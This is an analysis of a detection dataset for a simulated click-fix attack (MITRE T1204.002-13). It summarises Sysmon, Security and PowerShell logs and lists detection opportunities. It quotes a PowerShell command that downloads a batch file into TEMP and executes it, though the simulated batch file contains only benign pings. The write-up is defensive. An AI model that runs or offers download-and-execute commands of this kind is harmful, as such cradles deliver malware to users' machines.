# T1204.002-13: Malicious File — Simulate Click-Fix via Downloaded BAT File

## Technique Context

T1204.002 (User Execution: Malicious File) encompasses the broad category of attacks where a user is manipulated into executing a malicious file. The "click-fix" variant simulates a social engineering technique that has become increasingly common in phishing campaigns: victims are shown a fake error or verification dialog and instructed to copy and execute a command (or download and run a file) to "fix" the problem. The malicious payload is typically a batch file, PowerShell script, or signed binary that performs the attacker's actual objectives. The technique is particularly effective because the user is an active participant, bypassing many automated file delivery controls.

This dataset simulates the scenario where a user has already been convinced to execute a downloaded batch file — the technical execution rather than the social engineering component.

## What This Dataset Contains

This dataset captures a complete click-fix simulation with full execution of a downloaded batch file. The core attack chain is documented in Security EID 4688:

1. PowerShell (PID 0x4658) spawns with the download and execute command: `"powershell.exe" & {$url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat" $outfile = "$env:TEMP\click-fix.bat" Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing $process = Start-Process -FilePath $outfile -PassThru -W...}`
2. PowerShell (0x4658) spawns `cmd.exe` (PID 0x4688) with: `C:\Windows\system32\cmd.exe /c "C:\Windows\TEMP\click-fix.bat"`
3. cmd.exe spawns three `PING.EXE` processes (PIDs 0x4444, 0x4590, 0x46f4) from the batch file execution

Sysmon EID 22 records the DNS resolution for `raw.githubusercontent.com` resolving to `::ffff:185.199.109.133; ::ffff:185.199.110.133; ::ffff:185.199.111.133; ::ffff:185.199.108.133` (GitHub CDN addresses), confirming the external download. Sysmon EID 1 captures multiple PING.EXE process creations with `RuleName: technique_id=T1018,technique_name=Remote System Discovery`, as the batch file's `ping localhost -n 2` invocations are tagged as remote system discovery behavior. The file `C:\Windows\TEMP\click-fix.bat` is written to disk and a companion tracking file `C:\Windows\Temp\click-fix-pid.txt` (containing the batch process PID) is also created.

The Security channel records 7 EID 4688 events: two whoami.exe, one PowerShell (the attack), one cmd.exe, and three PING.EXE. Sysmon provides 35 events: 18 EID 7, 7 EID 1, 3 EID 11, 3 EID 10, 2 EID 17, 1 EID 22, and 1 EID 3. The file creation events (EID 11) capture the batch file being written to `C:\Windows\TEMP\click-fix.bat`.

The PowerShell channel records 101 events, dominated by test framework boilerplate with the EID 4104 cleanup block `try { Invoke-AtomicTest T1204.002 -TestNumbers 13 -Cleanup -Confirm:$false | Out-Null } catch {}` confirming the test completed.

## What This Dataset Does Not Contain

No Sysmon EID 3 network connection event appears for the actual HTTPS download to GitHub, though the DNS resolution (EID 22) confirms the lookup occurred. The connection was made by PowerShell before the Sysmon network filter captured it, or the network connection event was not included in the sampling. A complete dataset would show PowerShell connecting to one of the resolved IPs on port 443.

The batch file content is not captured in any log source — we see only its execution effects (ping commands). In a real attack scenario, the batch file could contain substantially more complex commands, and the only telemetry without content logging would be the processes it spawns.

## Assessment

Compared to the defended dataset (Sysmon: 44, Security: 16, PowerShell: 40), the undefended version has slightly fewer Sysmon events (35 vs. 44) but more Security events in terms of content richness. Both datasets show the technique executing successfully — Defender did not block the batch file download or execution, consistent with the file containing only benign ping commands.

The key distinction between this and the defended dataset is primarily the PowerShell logging completeness. This dataset is an excellent example of the click-fix attack chain because it shows the complete download-write-execute sequence with file creation confirmation, DNS resolution, and the process chain all in one dataset. The presence of Sysmon EID 11 confirming the `.bat` file write to `C:\Windows\TEMP\` is particularly valuable — many defenses catch the execution but miss the initial file drop.

## Detection Opportunities Present in This Data

- **Security EID 4688 / Sysmon EID 1**: PowerShell using `Invoke-WebRequest` to download a `.bat` file to `$env:TEMP` followed immediately by `Start-Process` to execute it — this download-and-execute pattern in a single command is a high-fidelity indicator of malicious intent
- **Sysmon EID 11**: `.bat` file creation in `C:\Windows\TEMP\` by a PowerShell process followed within seconds by `cmd.exe` executing that same file path
- **Security EID 4688**: `cmd.exe /c "C:\Windows\TEMP\click-fix.bat"` — batch files in TEMP directories being executed via cmd.exe are anomalous in normal user workflows
- **Sysmon EID 22**: DNS resolution for `raw.githubusercontent.com` by a PowerShell process, combined with a subsequent file write to TEMP, indicates a download-cradle pattern even before the file executes
- **Sysmon EID 1**: `PING.EXE` spawning as a child of `cmd.exe` which is itself a child of `powershell.exe` represents a three-level indirection that is characteristic of script-executed techniques; ping as a batch file activity is a classic time-delay/network-check primitive
- **File analysis**: The file path `C:\Windows\TEMP\click-fix.bat` and the companion `click-fix-pid.txt` are forensic artifacts that would survive the execution; the PID tracking file is a distinctive artifact not produced by legitimate software
